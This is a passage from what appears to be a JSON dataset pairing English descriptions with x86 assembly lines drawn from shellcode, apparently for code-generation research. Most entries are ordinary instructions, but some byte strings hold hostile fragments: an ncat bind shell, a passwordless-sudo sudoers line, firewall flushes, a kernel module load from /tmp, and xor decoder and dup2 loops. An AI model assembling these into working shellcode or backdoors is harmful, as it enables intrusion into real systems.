      "xor",
      "operation",
      "byte",
      "var1",
      "and",
      "var2",
      "value"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "xor",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var2"
    ]
  },
  {
    "intent": "define the function D4 and perform the xor operation between the byte of the shellcode and the 0x12 value",
    "rewritten_intent": "define the function D4 and perform the xor operation between the byte of the shellcode and the 0x12 value",
    "snippet": "D4: \\n xor byte [esi], 0x12",
    "slot_map": {
      "D4": "var0",
      "0x12": "var1"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "and",
      "perform",
      "xor",
      "operation",
      "byte",
      "shellcode",
      "and",
      "var1",
      "value"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "\\n",
      "xor",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var1"
    ]
  },
  {
    "intent": "declare the data label",
    "rewritten_intent": "declare the data label",
    "snippet": "data:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "data",
      "label"
    ],
    "snippet_tokens": [
      "data",
      ":"
    ]
  },
  {
    "intent": "define the byte string ',ajm,pk#########'",
    "rewritten_intent": "define the byte string ',ajm,pk#########'",
    "snippet": "db ',ajm,pk#########'",
    "slot_map": {
      "',ajm,pk#########'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define a byte string and initialize it to '/bin/sh'",
    "rewritten_intent": "define a byte string and initialize it to '/bin/sh'",
    "snippet": "db '/bin/sh'",
    "slot_map": {
      "'/bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/bin/sh'",
    "rewritten_intent": "define the byte string '/bin/sh'",
    "snippet": "db '/bin/sh'",
    "slot_map": {
      "'/bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/bin/sh#sh#'",
    "rewritten_intent": "define the byte string '/bin/sh#sh#'",
    "snippet": "db '/bin/sh#sh#'",
    "slot_map": {
      "'/bin/sh#sh#'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/etc/passwd#'",
    "rewritten_intent": "define the byte string '/etc/passwd#'",
    "snippet": "db '/etc/passwd#'",
    "slot_map": {
      "'/etc/passwd#'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/proc/sys/kernel/randomize_va_spacex'",
    "rewritten_intent": "define the byte string '/proc/sys/kernel/randomize_va_spacex'",
    "snippet": "db '/proc/sys/kernel/randomize_va_spacex'",
    "slot_map": {
      "'/proc/sys/kernel/randomize_va_spacex'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/sbin/insmod#/tmp/o.o'",
    "rewritten_intent": "define the byte string '/sbin/insmod#/tmp/o.o'",
    "snippet": "db '/sbin/insmod#/tmp/o.o'",
    "slot_map": {
      "'/sbin/insmod#/tmp/o.o'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/sbin/ipchains#-f#'",
    "rewritten_intent": "define the byte string '/sbin/ipchains#-f#'",
    "snippet": "db '/sbin/ipchains#-f#'",
    "slot_map": {
      "'/sbin/ipchains#-f#'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/sbin/iptables#-f#'",
    "rewritten_intent": "define the byte string '/sbin/iptables#-f#'",
    "snippet": "db '/sbin/iptables#-f#'",
    "slot_map": {
      "'/sbin/iptables#-f#'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'",
    "rewritten_intent": "define the byte string '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'",
    "snippet": "db '/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'",
    "slot_map": {
      "'/usr/bin/ncat#-lvp1337#-e/bin/bash#aaaabbbbccccdddd'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string '0',10",
    "rewritten_intent": "define the byte string '0',10",
    "snippet": "db '0',10",
    "slot_map": {
      "'0'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0,10"
    ],
    "snippet_tokens": [
      "db",
      "var0,10"
    ]
  },
  {
    "intent": "define the byte string 'all all=(all) nopasswd: all'",
    "rewritten_intent": "define the byte string 'all all=(all) nopasswd: all'",
    "snippet": "db 'all all=(all) nopasswd: all', 0xa",
    "slot_map": {
      "'all all=(all) nopasswd: all'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0",
      ",",
      "0xa"
    ]
  },
  {
    "intent": "define the byte string 'cp /bin/sh /tmp/sh'",
    "rewritten_intent": "define the byte string 'cp /bin/sh /tmp/sh'",
    "snippet": "db 'cp /bin/sh /tmp/sh'",
    "slot_map": {
      "'cp /bin/sh /tmp/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "initialize a string to 'egg mark'",
    "rewritten_intent": "initialize a string to 'egg mark'",
    "snippet": "db 'egg mark'",
    "slot_map": {
      "'egg mark'": "var0"
    },
    "intent_tokens": [
      "initialize",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string 'egg mark'",
    "rewritten_intent": "define the byte string 'egg mark'",
    "snippet": "db 'egg mark'",
    "slot_map": {
      "'egg mark'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string 'my.txtx'",
    "rewritten_intent": "define the byte string 'my.txtx'",
    "snippet": "db 'my.txtx'",
    "slot_map": {
      "'my.txtx'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string 'rm -f /tmp/f'",
    "rewritten_intent": "define the byte string 'rm -f /tmp/f'",
    "snippet": "db 'rm -f /tmp/f'",
    "slot_map": {
      "'rm -f /tmp/f'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b",
    "rewritten_intent": "define an array of bytes and initialize it to 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b",
    "snippet": "db 0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b",
    "slot_map": {
      "0x3e,0xcd,0x5d,0x75,0x3c,0x3c,0x80,0x75,0x75,0x3c,0x6f,0x76,0x7b": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare a byte contining 0x68",
    "rewritten_intent": "declare a byte contining 0x68",
    "snippet": "db 0x68",
    "slot_map": {
      "0x68": "var1",
      "contining": "var0"
    },
    "intent_tokens": [
      "declare",
      "byte",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "db",
      "var1"
    ]
  },
  {
    "intent": "declare a byte with no label containing the value 0x68",
    "rewritten_intent": "declare a byte with no label containing the value 0x68",
    "snippet": "db 0x68",
    "slot_map": {
      "0x68": "var0"
    },
    "intent_tokens": [
      "declare",
      "byte",
      "no",
      "label",
      "containing",
      "value",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare a byte and initialize it to 0x80",
    "rewritten_intent": "declare a byte and initialize it to 0x80",
    "snippet": "db 0x80",
    "slot_map": {
      "0x80": "var0"
    },
    "intent_tokens": [
      "declare",
      "byte",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare an unlabeled byte initialized to 0x80",
    "rewritten_intent": "declare an unlabeled byte initialized to 0x80",
    "snippet": "db 0x80",
    "slot_map": {
      "0x80": "var0"
    },
    "intent_tokens": [
      "declare",
      "unlabeled",
      "byte",
      "initialized",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d",
    "rewritten_intent": "define an array of bytes and initialize it to 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d",
    "snippet": "db 0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d",
    "slot_map": {
      "0x96,0xf0,0x5d,0x96,0xef,0x60,0x96,0xee,0xbd,0x18,0xda,0x8d": "var0"
    },
    "intent_tokens": [
      "define",
      "array",
      "bytes",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define a byte and initialize it to 0xcd",
    "rewritten_intent": "define a byte and initialize it to 0xcd",
    "snippet": "db 0xcd",
    "slot_map": {
      "0xcd": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte 0xcd",
    "rewritten_intent": "define the byte 0xcd",
    "snippet": "db 0xcd",
    "slot_map": {
      "0xcd": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "var0"
    ],
    "snippet_tokens": [
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare a byte with no label containing the value 10",
    "rewritten_intent": "declare a byte with no label containing the value 10",
    "snippet": "db 10",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "byte",
      "no",
      "label",
      "containing",
      "value",
      "10"
    ],
    "snippet_tokens": [
      "db",
      "10"
    ]
  },
  {
    "intent": "declare an unlabeled byte initialized to 10",
    "rewritten_intent": "declare an unlabeled byte initialized to 10",
    "snippet": "db 10",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "unlabeled",
      "byte",
      "initialized",
      "10"
    ],
    "snippet_tokens": [
      "db",
      "10"
    ]
  },
  {
    "intent": "define a byte and initialize it to 0xdeadbeef",
    "rewritten_intent": "define a byte and initialize it to 0xdeadbeef",
    "snippet": "dd 0xdeadbeef",
    "slot_map": {
      "0xdeadbeef": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "dd",
      "var0"
    ]
  },
  {
    "intent": "decrement the bl register and jump to L1 if the result is not zero",
    "rewritten_intent": "decrement the bl register and jump to L1 if the result is not zero",
    "snippet": "dec bl \\n jnz L1",
    "slot_map": {
      "L1": "var1",
      "bl": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jnz",
      "var1"
    ]
  },
  {
    "intent": "decrement the byte at the address dl by one",
    "rewritten_intent": "decrement the byte at the address dl by one",
    "snippet": "dec byte dl",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "byte",
      "address",
      "dl",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "byte",
      "dl"
    ]
  },
  {
    "intent": "decrement the byte in dl",
    "rewritten_intent": "decrement the byte in dl",
    "snippet": "dec byte dl",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "byte",
      "dl"
    ],
    "snippet_tokens": [
      "dec",
      "byte",
      "dl"
    ]
  },
  {
    "intent": "decrement the cl register by one",
    "rewritten_intent": "decrement the cl register by one",
    "snippet": "dec cl",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "cl",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "cl"
    ]
  },
  {
    "intent": "decrement the contents of cl",
    "rewritten_intent": "decrement the contents of cl",
    "snippet": "dec cl",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "contents",
      "cl"
    ],
    "snippet_tokens": [
      "dec",
      "cl"
    ]
  },
  {
    "intent": "decrement the contents of the cl register",
    "rewritten_intent": "decrement the contents of the cl register",
    "snippet": "dec cl",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "contents",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "dec",
      "cl"
    ]
  },
  {
    "intent": "decrement the contents of the cl register and jump to the dup2 label if the result is not negative",
    "rewritten_intent": "decrement the contents of the cl register and jump to the dup2 label if the result is not negative",
    "snippet": "dec cl \\n jns dup2",
    "slot_map": {
      "dup2": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "cl",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "cl",
      "\\n",
      "jns",
      "var0"
    ]
  },
  {
    "intent": "decrement the contents of the cl register and jump to the loopinghere label if the result is not negative",
    "rewritten_intent": "decrement the contents of the cl register and jump to the loopinghere label if the result is not negative",
    "snippet": "dec cl \\n jns loopinghere",
    "slot_map": {
      "loopinghere": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "cl",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "cl",
      "\\n",
      "jns",
      "var0"
    ]
  },
  {
    "intent": "decrement cl and jump to L2 if the result is not equal to zero",
    "rewritten_intent": "decrement cl and jump to L2 if the result is not equal to zero",
    "snippet": "dec cl \\n jnz L2",
    "slot_map": {
      "L2": "var0"
    },
    "intent_tokens": [
      "decrement",
      "cl",
      "and",
      "jump",
      "var0",
      "if",
      "result",
      "not",
      "equal",
      "zero"
    ],
    "snippet_tokens": [
      "dec",
      "cl",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "decrement cl and jump to L2 if the result is zero",
    "rewritten_intent": "decrement cl and jump to L2 if the result is zero",
    "snippet": "dec cl \\n jz L2",
    "slot_map": {
      "L2": "var0"
    },
    "intent_tokens": [
      "decrement",
      "cl",
      "and",
      "jump",
      "var0",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "dec",
      "cl",
      "\\n",
      "jz",
      "var0"
    ]
  },
  {
    "intent": "decrement the dl register by one",
    "rewritten_intent": "decrement the dl register by one",
    "snippet": "dec dl",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "dl",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "dl"
    ]
  },
  {
    "intent": "decrement the contents of the eax register",
    "rewritten_intent": "decrement the contents of the eax register",
    "snippet": "dec eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "subtract one from the contents of eax",
    "rewritten_intent": "subtract one from the contents of eax",
    "snippet": "dec eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "one",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement the eax register by one",
    "rewritten_intent": "decrement the eax register by one",
    "snippet": "dec eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement eax",
    "rewritten_intent": "decrement eax",
    "snippet": "dec eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrease ebp",
    "rewritten_intent": "decrease ebp",
    "snippet": "dec ebp",
    "slot_map": {
      "ebp": "var0"
    },
    "intent_tokens": [
      "decrease",
      "var0"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "subtract one from the contents of ebx",
    "rewritten_intent": "subtract one from the contents of ebx",
    "snippet": "dec ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "one",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement the ebx register by one",
    "rewritten_intent": "decrement the ebx register by one",
    "snippet": "dec ebx",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement ecx by 1",
    "rewritten_intent": "decrement ecx by 1",
    "snippet": "dec ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "1"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register",
    "rewritten_intent": "decrement the contents of the ecx register",
    "snippet": "dec ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement the ecx register by one",
    "rewritten_intent": "decrement the ecx register by one",
    "snippet": "dec ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the _dup2_loop label if the result is not negative",
    "snippet": "dec ecx \\n jns _dup2_loop",
    "slot_map": {
      "ecx": "var0",
      "_dup2_loop": "var1"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the 2f_loop label if the result is not negative",
    "snippet": "dec ecx \\n jns 2f_loop",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "2f_loop",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "2f_loop"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the dup2 label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the dup2 label if the result is not negative",
    "snippet": "dec ecx \\n jns dup2",
    "slot_map": {
      "ecx": "var0",
      "dup2": "var1"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the dup2loop label if the result is not negative",
    "snippet": "dec ecx \\n jns dup2loop",
    "slot_map": {
      "ecx": "var0",
      "dup2loop": "var1"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0",
    "rewritten_intent": "decrement ecx by 1 and jump to the dup2loop procedure until ecx equals 0",
    "snippet": "dec ecx \\n jns dup2loop",
    "slot_map": {
      "ecx": "var0",
      "dup2loop": "var2",
      "until": "var3"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "1",
      "and",
      "jump",
      "var2",
      "procedure",
      "var3",
      "var0",
      "equals",
      "0"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "var2"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the duploop label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the duploop label if the result is not negative",
    "snippet": "dec ecx \\n jns duploop",
    "slot_map": {
      "ecx": "var0",
      "duploop": "var1"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the loop label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the loop label if the result is not negative",
    "snippet": "dec ecx \\n jns loop",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "loop",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "loop"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the loop2 label if the result is not negative",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the loop2 label if the result is not negative",
    "snippet": "dec ecx \\n jns loop2",
    "slot_map": {
      "ecx": "var0",
      "loop2": "var1"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero",
    "rewritten_intent": "decrement the contents of the ecx register and jump to the counter_is_now_zero label if the result is zero",
    "snippet": "dec ecx \\n jz counter_is_now_zero",
    "slot_map": {
      "counter_is_now_zero": "var1",
      "ecx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "zero"
    ],
    "snippet_tokens": [
      "dec",
      "var0",
      "\\n",
      "jz",
      "var1"
    ]
  },
  {
    "intent": "decrement the edx register by one",
    "rewritten_intent": "decrement the edx register by one",
    "snippet": "dec edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement edx",
    "rewritten_intent": "decrement edx",
    "snippet": "dec edx",
    "slot_map": {
      "edx": "var0"
    },
    "intent_tokens": [
      "decrement",
      "var0"
    ],
    "snippet_tokens": [
      "dec",
      "var0"
    ]
  },
  {
    "intent": "decrement the esp register by one",
    "rewritten_intent": "decrement the esp register by one",
    "snippet": "dec esp",
    "slot_map": {},
    "intent_tokens": [
      "decrement",
      "esp",
      "register",
      "one"
    ],
    "snippet_tokens": [
      "dec",
      "esp"
    ]
  },
  {
    "intent": "define decode label",
    "rewritten_intent": "define decode label",
    "snippet": "decode:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "decode",
      "label"
    ],
    "snippet_tokens": [
      "decode",
      ":"
    ]
  },
  {
    "intent": "declare the decoder function",
    "rewritten_intent": "declare the decoder function",
    "snippet": "decoder:",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define decoder function",
    "rewritten_intent": "define decoder function",
    "snippet": "decoder:",
    "slot_map": {
      "decoder": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the decoder label",
    "rewritten_intent": "declare the decoder label",
    "snippet": "decoder:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "decoder",
      "label"
    ],
    "snippet_tokens": [
      "decoder",
      ":"
    ]
  },
  {
    "intent": "declare a constant size and set equal to 25",
    "rewritten_intent": "declare a constant size and set equal to 25",
    "snippet": "dim: equ 25",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "constant",
      "size",
      "and",
      "set",
      "equal",
      "25"
    ],
    "snippet_tokens": [
      "dim",
      ":",
      "equ",
      "25"
    ]
  },
  {
    "intent": "define dim to be 512 bytes large",
    "rewritten_intent": "define dim to be 512 bytes large",
    "snippet": "dim: equ 512",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "dim",
      "be",
      "512",
      "bytes",
      "large"
    ],
    "snippet_tokens": [
      "dim",
      ":",
      "equ",
      "512"
    ]
  },
  {
    "intent": "divide the contents of eax by the word value stored at memory location value",
    "rewritten_intent": "divide the contents of eax by the word value stored at memory location value",
    "snippet": "div dword [value]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "divide",
      "contents",
      "var0",
      "word",
      "value",
      "stored",
      "memory",
      "location",
      "value"
    ],
    "snippet_tokens": [
      "div",
      "dword",
      "[",
      "value",
      "]"
    ]
  },
  {
    "intent": "divide the contents of in eax by by the word value stored at memory location var",
    "rewritten_intent": "divide the contents of in eax by by the word value stored at memory location var",
    "snippet": "div dword [var]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "divide",
      "contents",
      "var0",
      "by",
      "word",
      "value",
      "stored",
      "memory",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "div",
      "dword",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "divide eax by ebx",
    "rewritten_intent": "divide eax by ebx",
    "snippet": "div ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "div",
      "var1"
    ]
  },
  {
    "intent": "divide the contents of eax by the contents of ebx",
    "rewritten_intent": "divide the contents of eax by the contents of ebx",
    "snippet": "div ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "divide",
      "contents",
      "var0",
      "contents",
      "var1"
    ],
    "snippet_tokens": [
      "div",
      "var1"
    ]
  },
  {
    "intent": "divide eax by ecx the result of the division is stored in eax and the remainder in edx",
    "rewritten_intent": "divide eax by ecx the result of the division is stored in eax and the remainder in edx",
    "snippet": "div ecx",
    "slot_map": {
      "eax": "var0",
      "ecx": "var2",
      "edx": "var3"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "var2",
      "result",
      "division",
      "stored",
      "var0",
      "and",
      "remainder",
      "var3"
    ],
    "snippet_tokens": [
      "div",
      "var2"
    ]
  },
  {
    "intent": "divide eax by value in edx",
    "rewritten_intent": "divide eax by value in edx",
    "snippet": "div edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "value",
      "var1"
    ],
    "snippet_tokens": [
      "div",
      "var1"
    ]
  },
  {
    "intent": "divide eax by esi",
    "rewritten_intent": "divide eax by esi",
    "snippet": "div esi",
    "slot_map": {
      "eax": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "divide",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "div",
      "var1"
    ]
  },
  {
    "intent": "declare the do_dup label",
    "rewritten_intent": "declare the do_dup label",
    "snippet": "do_dup:",
    "slot_map": {
      "do_dup": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "define do_dup label",
    "rewritten_intent": "define do_dup label",
    "snippet": "do_dup:",
    "slot_map": {
      "do_dup": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the doit label",
    "rewritten_intent": "declare the doit label",
    "snippet": "doit:",
    "slot_map": {
      "doit": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the done label",
    "rewritten_intent": "declare the done label",
    "snippet": "done:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
